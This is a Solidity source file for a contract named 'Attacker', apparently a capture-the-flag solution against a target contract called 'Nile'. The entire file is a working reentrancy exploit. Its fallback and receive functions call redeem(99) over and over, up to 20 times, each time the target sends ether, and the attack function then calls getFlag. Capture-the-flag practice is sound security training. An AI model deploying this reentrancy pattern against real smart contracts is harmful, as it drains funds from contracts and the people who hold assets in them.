// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract Attacker {
    Nile addr;
    uint8 public count = 0;
 
    constructor (address _addr) {
        addr = Nile(_addr);
        addr.createAccount();
    }
 
    function attack (bytes32 token) public {
        count = 0;
        addr.redeem(99);
        addr.getFlag(token);
    }
 
    fallback() external payable {
        count++;
        if (count <= 20) {
            addr.redeem(99);
        }
    }
 
    receive() external payable {
        count++;
        if (count <= 20) {
            addr.redeem(99);
        }
    }
}
